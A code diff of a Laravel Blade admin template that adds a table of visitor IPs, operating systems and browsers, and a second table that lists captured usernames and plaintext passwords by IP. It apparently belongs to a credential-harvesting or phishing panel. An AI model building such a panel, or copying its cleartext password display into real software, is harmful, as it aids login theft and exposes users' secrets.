@@ -68,38 +68,44 @@
 <section class="content">
     <div class="container-fluid">
         <div class="row">
-            <div class="col-12">
+            <div class="col-7">
                 <div class="card">
                     <div class="card-header">
-                    <h3 class="card-title">User's lists</h3>
+                    <h3 class="card-title">List of Users</h3>
                     </div>
                     <!-- /.card-header -->
                     <div class="card-body">
                         <table id="example" class="table table-striped" style="width:100%">
                             <thead>
                                 <tr>
-                                    <th>Id</th>
-                                    <th>Username</th>
-                                    <th>Password</th>
-                                    <th>Created At</th>
+                                    <th>Ip Address</th>
+                                    <th>Type Ip</th>
+                                    <th>Operative System</th>
+                                    <th>User Agent</th>
+                                    <th>Browser</th>
+                                    <th>Date</th>
                                 </tr>
                             </thead>
                             <tbody>
                                 @foreach ($data as $dat)
                                 <tr>
-                                    <td>{{ $dat->id }}</td>
-                                    <td>{{ $dat->username }}</td>
-                                    <td>{{ $dat->password }}</td>
+                                    <td>{{ $dat->ip }}</td>
+                                    <td>{{ $dat->type }}</td>
+                                    <td>{{ $dat->os }}</td>
+                                    <td>{{ $dat->useragent }}</td>
+                                    <td>{{ $dat->browser }}</td>
                                     <td>{{ $dat->created_at }}</td>
                                 </tr>
                                 @endforeach
                             </tbody>
                             <tfoot>
                                 <tr>
-                                    <th>Id</th>
-                                    <th>Username</th>
-                                    <th>Password</th>
-                                    <th>Created At</th>
+                                    <th>Ip Address</th>
+                                    <th>Type Ip</th>
+                                    <th>Operative System</th>
+                                    <th>User Agent</th>
+                                    <th>Browser</th>
+                                    <th>Date</th>
                                 </tr>
                             </tfoot>
                         </table>
@@ -112,6 +118,50 @@
             <!-- /.card -->
             </div>
             <!-- /.col -->
+
+            <div class="col-5">
+                <div class="card">
+                    <div class="card-header">
+                    <h3 class="card-title">List of Users</h3>
+                    </div>
+                    <!-- /.card-header -->
+                    <div class="card-body">
+                        <table id="example" class="table table-striped" style="width:100%">
+                            <thead>
+                                <tr>
+                                    <th>Ip Address</th>
+                                    <th>Username</th>
+                                    <th>Password</th>
+                                    <th>Date</th>
+                                </tr>
+                            </thead>
+                            <tbody>
+                                @foreach ($credentials as $cred)
+                                <tr>
+                                    <td>{{ $cred->ip }}</td>
+                                    <td>{{ $cred->username }}</td>
+                                    <td>{{ $cred->password }}</td>
+                                    <td>{{ $cred->created_at }}</td>
+                                </tr>
+                                @endforeach
+                            </tbody>
+                            <tfoot>
+                                <tr>
+                                    <th>Ip Address</th>
+                                    <th>Username</th>
+                                    <th>Password</th>
+                                    <th>Date</th>
+                                </tr>
+                            </tfoot>
+                        </table>
+                    </div>
+                    <!-- /.card-body -->
+                </div>
+                <!-- /.card -->
+
+            
+            <!-- /.card -->
+            </div>
         </div>
         <!-- /.row -->
     </div>
